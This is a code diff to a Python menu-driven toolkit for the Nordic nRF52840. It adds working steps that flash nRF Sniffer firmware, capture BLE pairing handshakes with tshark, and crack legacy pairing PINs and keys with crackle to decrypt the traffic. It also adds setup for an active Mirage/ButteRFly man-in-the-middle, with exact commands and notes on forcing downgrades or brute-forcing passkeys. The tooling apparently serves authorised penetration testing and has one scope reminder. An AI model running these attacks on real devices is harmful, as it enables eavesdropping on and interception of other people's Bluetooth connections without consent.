@@ -88,6 +88,12 @@ SDK_NRF_API_URL = (
     "https://api.github.com/repos/NordicSemiconductor/sdk-nrf/releases/latest"
 )
 
+# BLE pairing-crack / MITM tooling repos (fetched by firmware/download.py into
+# firmware/nordic_nrf52840/, mirroring the cc26x2r1 / nrf52833_dk boards).
+CRACKLE_REPO   = "https://github.com/mikeryan/crackle"
+MIRAGE_REPO    = "https://github.com/RCayre/mirage"
+BUTTERFLY_REPO = "https://github.com/RCayre/butterfly"
+
 CONNECT_INSTRUCTIONS = (
     "Nordic nRF52840 not detected.\n\n"
     "  DONGLE (PCA10059) — VID:PID 1915:520F (app) or 1915:521F (DFU):\n"
@@ -604,6 +610,350 @@ def op_flash_dk(port: str):
         err(f"nrfjprog flash error: {e}")
 
 
+def _sniffer_fw_dir() -> Path:
+    """firmware/nordic_nrf52840/ble_sniffer — where download.py vendors the hex."""
+    return get_firmware_dir("nordic_nrf52840") / "ble_sniffer"
+
+
+def _find_sniffer_hex() -> Path:
+    """Locate an nRF52840 nRF Sniffer .hex under the vendored firmware dir."""
+    base = _sniffer_fw_dir()
+    if not base.exists():
+        return None
+    matches = sorted(base.rglob("*nrf52840*.hex")) or sorted(base.rglob("*.hex"))
+    return matches[0] if matches else None
+
+
+def _find_extcap_plugin() -> Path:
+    """Locate the nRF Sniffer Wireshark extcap plugin (nrf_sniffer_ble.py)."""
+    base = get_firmware_dir("nordic_nrf52840")
+    if not base.exists():
+        return None
+    matches = sorted(base.rglob("nrf_sniffer_ble.py"))
+    return matches[0] if matches else None
+
+
+def _extcap_dir() -> Path:
+    return Path.home() / ".config" / "wireshark" / "extcap"
+
+
+def op_flash_sniffer_dk(port: str):
+    heading("Flash nRF Sniffer Firmware to DK (J-Link)")
+    info("Flashing the nRF Sniffer for Bluetooth LE firmware onto the nRF52840-DK")
+    info("via the onboard J-Link. This is the firmware that turns the DK into a")
+    info("passive BLE sniffer for Wireshark — the prerequisite for pairing capture.")
+    info("")
+
+    dk_port = find_serial_port_by_vidpid(VID_PID_DK_JLINK)
+    if not dk_port:
+        err("nRF52840-DK (J-Link, 1366:1015) not detected.")
+        info("  Connect the DK via its J-LINK/OB USB port, then retry.")
+        info("  The dongle variant flashes the sniffer via 'Flash Dongle (nrfutil DFU)'.")
+        return
+
+    hexf = _find_sniffer_hex()
+    if not hexf:
+        warn("No nRF Sniffer .hex found under firmware/nordic_nrf52840/ble_sniffer/.")
+        info("  Fetch it first (nrfutil ble-sniffer component or GitHub release):")
+        info("    python3 firmware/download.py --tools nordic_nrf52840 --yes")
+        info("  Or install manually: nrfutil install ble-sniffer")
+        info("  Then re-run this option.")
+        return
+    ok(f"nRF Sniffer firmware: {hexf}")
+
+    if not confirm(f"Flash {hexf.name} to the nRF52840-DK via J-Link?", default=True):
+        info("Flash cancelled.")
+        return
+
+    cmd = f"nrfjprog --program {hexf} --sectorerase --verify"
+    info(f"Running: {cmd}")
+    try:
+        r = run(cmd)
+        if r.returncode == 0:
+            ok("nRF Sniffer firmware flashed.")
+            run("nrfjprog --reset")
+            ok("Device reset — the DK is now a BLE sniffer.")
+            info("  Next: install the Wireshark extcap plugin, then run 'BLE Capture'.")
+        else:
+            err("nrfjprog flash failed.")
+            info("  Check J-Link: nrfjprog --ids   |   ensure the .hex is for nRF52840")
+    except FileNotFoundError:
+        err("nrfjprog not found. Install nRF Command Line Tools.")
+    except Exception as e:
+        err(f"nrfjprog flash error: {e}")
+
+
+def op_wireshark_extcap():
+    heading("Wireshark extcap Setup (nRF Sniffer)")
+    info("Installing the nRF Sniffer Wireshark extcap plugin so the DK shows up as")
+    info("a live capture interface named 'nRF Sniffer for Bluetooth LE'.")
+    info("")
+    info("The plugin (nrf_sniffer_ble.py) ships inside the nRF Sniffer download and")
+    info("lets Wireshark drive the sniffer — including FOLLOWING a specific device,")
+    info("which is how you capture a full pairing exchange for the PIN crack.")
+    info("")
+
+    plugin = _find_extcap_plugin()
+    if not plugin:
+        warn("nrf_sniffer_ble.py not found under firmware/nordic_nrf52840/.")
+        info("  Fetch the nRF Sniffer package first:")
+        info("    python3 firmware/download.py --tools nordic_nrf52840 --yes")
+        info("  The plugin lives in the 'extcap/' folder of that download.")
+        return
+    ok(f"extcap plugin found: {plugin}")
+
+    extcap = _extcap_dir()
+    info("")
+    info("The plugin needs the SheerWater/nordic python deps (pyserial) importable.")
+    ensure_pip_packages([("serial", "pyserial")])
+
+    if not confirm(f"Install the plugin into {extcap}?", default=True):
+        info("SETUP (manual):")
+        info(f"  mkdir -p {extcap}")
+        info(f"  cp {plugin} {extcap}/")
+        info(f"  chmod +x {extcap}/nrf_sniffer_ble.py")
+        info("  Restart Wireshark; confirm: wireshark --list-interfaces | grep -i nrf")
+        return
+
+    try:
+        extcap.mkdir(parents=True, exist_ok=True)
+        dest = extcap / plugin.name
+        r = run(f"cp {plugin} {dest}")
+        if r.returncode == 0:
+            run(f"chmod +x {dest}")
+            ok(f"Installed extcap plugin: {dest}")
+            info("  Restart Wireshark — 'nRF Sniffer for Bluetooth LE' appears in the")
+            info("  interface list. Click its gear icon to pick the target device to")
+            info("  follow before you start the capture.")
+            info("  Verify: tshark -D | grep -i nrf_sniffer")
+        else:
+            err("Failed to copy the extcap plugin.")
+            info(f"  Manual: cp {plugin} {dest} && chmod +x {dest}")
+    except Exception as e:
+        err(f"extcap install error: {e}")
+
+
+def op_ble_capture(port: str):
+    heading("BLE Capture (nRF Sniffer -> pcap)")
+    info("Capturing BLE traffic with the DK's nRF Sniffer firmware into a pcap.")
+    info("To crack a pairing PIN you MUST capture the FULL pairing handshake, so")
+    info("start this capture BEFORE the two devices pair (or force a re-pair).")
+    info("")
+    info("TARGET FOLLOWING: the nRF Sniffer follows ONE device at a time. The most")
+    info("reliable way to lock onto your target is Wireshark's toolbar (the extcap")
+    info("gear picks the device). This headless path captures on the sniffer")
+    info("interface for a fixed duration; use it once the sniffer is set to follow")
+    info("your target, or to grab all advertising traffic to identify the target.")
+    info("")
+
+    tshark = run_output("which tshark 2>/dev/null || true")
+    if not (tshark and tshark.strip()):
+        err("tshark not found — install Wireshark/tshark first.")
+        info("  Linux: sudo apt-get install -y tshark")
+        info("  macOS: brew install --cask wireshark  (or: brew install wireshark)")
+        return
+
+    if not _find_extcap_plugin() and not _extcap_dir().joinpath("nrf_sniffer_ble.py").exists():
+        warn("nRF Sniffer extcap plugin not installed — run 'Wireshark extcap Setup' first.")
+        info("  Without it, tshark will not see the nRF Sniffer interface.")
+        return
+
+    info("Enumerating capture interfaces (tshark -D)…")
+    listing = run_output("tshark -D 2>/dev/null || true")
+    ifaces = [ln for ln in (listing or "").splitlines() if "nrf_sniffer" in ln.lower()]
+    if not ifaces:
+        warn("No nRF Sniffer interface found in 'tshark -D' output.")
+        info("  - Restart Wireshark/tshark after installing the extcap plugin")
+        info("  - Confirm the DK is flashed with nRF Sniffer firmware and enumerated")
+        info("  - Check: tshark -D   and   ls -la /dev/ttyACM*")
+        return
+
+    info("nRF Sniffer interfaces:")
+    for ln in ifaces:
+        info(f"  {ln}")
+    # tshark -D lines look like "N. iface_name" — take the name of the first match.
+    iface = ifaces[0].split(".", 1)[-1].strip().split()[0]
+    iface = prompt("Capture interface name", default=iface)
+    if not iface:
+        warn("No interface provided. Aborting.")
+        return
+
+    try:
+        duration = int(prompt("Capture duration (seconds)", default="120") or "120")
+    except ValueError:
+        duration = 120
+
+    default_pcap = str(Path.cwd() / f"nrf_sniffer_{time.strftime('%Y%m%d_%H%M%S')}.pcap")
+    pcap = Path(prompt("Output pcap path", default=default_pcap))
+    pcap.parent.mkdir(parents=True, exist_ok=True)
+
+    info(f"Interface : {iface}")
+    info(f"Duration  : {duration}s")
+    info(f"Output    : {pcap}")
+    if not confirm("Start the capture now?", default=True):
+        info("Capture cancelled.")
+        return
+
+    cmd = ["tshark", "-i", iface, "-a", f"duration:{duration}", "-w", str(pcap)]
+    info(f"Running: {' '.join(cmd)}")
+    info("  Trigger/force the pairing on the target now so the handshake is captured.")
+    try:
+        rc = run_streaming(cmd, on_line=lambda l: info(f"  tshark: {l}"),
+                           timeout=duration + 60)
+        if rc != 0:
+            warn(f"tshark exited with code {rc}.")
+    except KeyboardInterrupt:
+        info("Capture interrupted by user (Ctrl-C).")
+
+    if pcap.exists() and pcap.stat().st_size > 0:
+        ok(f"pcap saved: {pcap} ({pcap.stat().st_size // 1024} KB)")
+        info("  Legacy pairing? Recover the PIN/TK with 'Crack Pairing (crackle)'.")
+        info("  Secure Connections? crackle can't help — use 'BLE MITM (Mirage)'.")
+    else:
+        warn("No pcap data was written — was any BLE traffic seen?")
+        info("  Verify the DK is on nRF Sniffer firmware and following the target.")
+
+
+def op_crack_pairing():
+    heading("Crack Pairing (crackle)")
+    info("Recovering the pairing key material from a capture of a BLE LEGACY pairing")
+    info("exchange using crackle by Mike Ryan.")
+    info("")
+    info("IMPORTANT — crackle only cracks BLE LEGACY pairing:")
+    info("  - Works on: LE Legacy pairing (JustWorks, Passkey Entry)")
+    info("  - For Passkey Entry, the recovered TK IS the 6-digit PIN")
+    info("  - Does NOT work on: LE Secure Connections (ECDH) — use 'BLE MITM (Mirage)'")
+    info("  The capture MUST contain the full pairing handshake (connect request")
+    info("  through key distribution) — capture BEFORE the devices pair.")
+    info("")
+    info("crackle recovers the TK/STK/LTK, then decrypts the encrypted packets and")
+    info("writes a cleartext pcap you can analyse in Wireshark.")
+    info("")
+
+    crackle = run_output("which crackle 2>/dev/null || true")
+    if not (crackle and crackle.strip()):
+        # Fall back to the vendored build under firmware/nordic_nrf52840/crackle.
+        vendored = get_firmware_dir("nordic_nrf52840") / "crackle" / "crackle"
+        if vendored.exists():
+            crackle = str(vendored)
+        else:
+            warn("crackle not found on PATH.")
+            info("  Fetch + build it via the firmware downloader:")
+            info("    python3 firmware/download.py --tools nordic_nrf52840 --yes")
+            info("  Or from source:")
+            info(f"    git clone {CRACKLE_REPO} && cd crackle && make")
+            info("    sudo cp crackle /usr/local/bin/   (optional — put it on PATH)")
+            info("  Debian/Kali package: sudo apt-get install -y crackle")
+            return
+    ok(f"crackle: {crackle.strip()}")
+
+    pcap_path = prompt("Path to the captured .pcap (must contain legacy pairing)")
+    if not pcap_path:
+        warn("No pcap provided. Aborting.")
+        return
+    pcap = Path(pcap_path)
+    if not pcap.exists():
+        err(f"File not found: {pcap}")
+        return
+
+    default_out = str(pcap.with_name(pcap.stem + "_decrypted.pcap"))
+    out_pcap = Path(prompt("Output decrypted pcap path", default=default_out))
+
+    if not confirm(f"Run crackle on {pcap.name}?", default=True):
+        info("crackle run cancelled.")
+        return
+
+    cmd = [crackle.strip(), "-i", str(pcap), "-o", str(out_pcap)]
+    info(f"Running: {' '.join(cmd)}")
+    rc = run_streaming(cmd, on_line=lambda l: info(f"  crackle: {l}"), timeout=600)
+    if rc == 0 and out_pcap.exists():
+        ok(f"Decrypted pcap written: {out_pcap}")
+        info("  crackle prints the recovered TK (PIN)/LTK above — note it for the report.")
+        info("  Open the decrypted pcap in Wireshark — ATT/GATT payloads are cleartext.")
+    else:
+        warn(f"crackle exited with code {rc}.")
+        info("Troubleshooting:")
+        info("  - Ensure the capture contains a COMPLETE legacy pairing handshake")
+        info("  - LE Secure Connections cannot be cracked (ECDH) — check the capture")
+        info("  - Re-capture with the sniffer running BEFORE the devices pair")
+        info("  - Try crackle -v for verbose output on what it found")
+
+
+def op_ble_mitm():
+    heading("BLE MITM (Mirage + ButteRFly)")
+    info("Active man-in-the-middle for BLE — used when the target pairs with LE")
+    info("Secure Connections (which crackle CANNOT break). The nRF52840 sits between")
+    info("the central and peripheral, relaying the connection and capturing/handling")
+    info("the pairing so the passkey/PIN can be intercepted or forced.")
+    info("")
+    info("STACK:")
+    info("  - ButteRFly firmware (RCayre) flashed to the nRF52840 — the radio backend")
+    info("  - Mirage (RCayre) on the host — the BLE attack framework driving it")
+    info("")
+    info("NOTE: LE Secure Connections uses ECDH, so the passkey cannot be recovered")
+    info("passively. A MITM works by relaying the pair and either observing Passkey")
+    info("Entry, forcing a JustWorks/legacy downgrade, or brute-forcing the 6-digit")
+    info("passkey — effectiveness depends on the target's IO capabilities and whether")
+    info("it enforces authenticated pairing. Confirm this is in scope for the client.")
+    info("")
+
+    # ButteRFly firmware
+    bfly_dir = get_firmware_dir("nordic_nrf52840") / "butterfly"
+    bfly_hex = None
+    if bfly_dir.exists():
+        hits = sorted(bfly_dir.rglob("*nrf52840*.hex")) or sorted(bfly_dir.rglob("*.hex"))
+        bfly_hex = hits[0] if hits else None
+
+    if bfly_hex:
+        ok(f"ButteRFly firmware: {bfly_hex}")
+        dk_port = find_serial_port_by_vidpid(VID_PID_DK_JLINK)
+        if dk_port and confirm("Flash ButteRFly firmware to the DK via J-Link now?",
+                               default=False):
+            cmd = f"nrfjprog --program {bfly_hex} --sectorerase --verify"
+            info(f"Running: {cmd}")
+            try:
+                r = run(cmd)
+                if r.returncode == 0:
+                    run("nrfjprog --reset")
+                    ok("ButteRFly firmware flashed and device reset.")
+                else:
+                    err("nrfjprog flash failed — see output above.")
+            except FileNotFoundError:
+                err("nrfjprog not found. Install nRF Command Line Tools.")
+            except Exception as e:
+                err(f"nrfjprog flash error: {e}")
+    else:
+        warn("ButteRFly firmware not found under firmware/nordic_nrf52840/butterfly/.")
+        info("  Fetch it via the firmware downloader (built if a toolchain is present):")
+        info("    python3 firmware/download.py --tools nordic_nrf52840 --yes")
+        info(f"  Or build from source: {BUTTERFLY_REPO}")
+
+    # Mirage host framework
+    info("")
+    mirage = run_output("which mirage 2>/dev/null || true")
+    if mirage and mirage.strip():
+        ok(f"Mirage: {mirage.strip()}")
+    else:
+        warn("Mirage not found on PATH.")
+        info("  Install the host framework:")
+        info(f"    git clone {MIRAGE_REPO} && cd mirage && sudo python3 setup.py install")
+        info("  (Debian/Kali; needs the ButteRFly-flashed nRF52840 as the interface.)")
+
+    info("")
+    info("RUN THE MITM (once ButteRFly is flashed and Mirage is installed):")
+    info("  List the interface Mirage sees for the board:")
+    info("    mirage \"ble_info|INTERFACE=butterfly0\"")
+    info("  MITM a connection between a central and the target peripheral:")
+    info("    mirage \"ble_mitm|"
+         "INTERFACE1=butterfly0|INTERFACE2=butterfly1|TARGET=<peripheral_MAC>|"
+         "MASTER_FILE=master.cap|SLAVE_FILE=slave.cap\"")
+    info("  Mirage's ble_mitm captures the SMP pairing on both sides; combine with")
+    info("  its pairing modules to observe/force the passkey. See the Mirage docs for")
+    info("  the exact module chain for your target's pairing mode.")
+    info("")
+    pause("Press ENTER to continue.")
+
+
 def op_create_dfu_package():
     heading("Create DFU Package")
     info("Creating a nrfutil DFU .zip package from a .hex firmware file.")
@@ -762,7 +1112,12 @@ def main():
 
     MENU_OPTIONS = [
         "Device Info",
-        "BLE Sniffer Setup",
+        "BLE Sniffer Setup (firmware/Wireshark reference)",
+        "Flash nRF Sniffer Firmware to DK (J-Link)",
+        "Wireshark extcap Setup (nRF Sniffer)",
+        "BLE Capture (nRF Sniffer -> pcap)",
+        "Crack Pairing (crackle — legacy PIN/TK)",
+        "BLE MITM (Mirage + ButteRFly — Secure Connections)",
         "Zigbee / Thread NCP Info",
         "Flash Dongle (nrfutil DFU)",
         "Flash DK (J-Link / nrfjprog)",
@@ -778,14 +1133,24 @@ def main():
         elif choice == 1:
             op_ble_sniff(port)
         elif choice == 2:
-            op_zigbee_info()
+            op_flash_sniffer_dk(port)
         elif choice == 3:
-            op_flash_dongle(port)
+            op_wireshark_extcap()
         elif choice == 4:
-            op_flash_dk(port)
+            op_ble_capture(port)
         elif choice == 5:
-            op_create_dfu_package()
+            op_crack_pairing()
         elif choice == 6:
+            op_ble_mitm()
+        elif choice == 7:
+            op_zigbee_info()
+        elif choice == 8:
+            op_flash_dongle(port)
+        elif choice == 9:
+            op_flash_dk(port)
+        elif choice == 10:
+            op_create_dfu_package()
+        elif choice == 11:
             info("Goodbye.")
             break
 
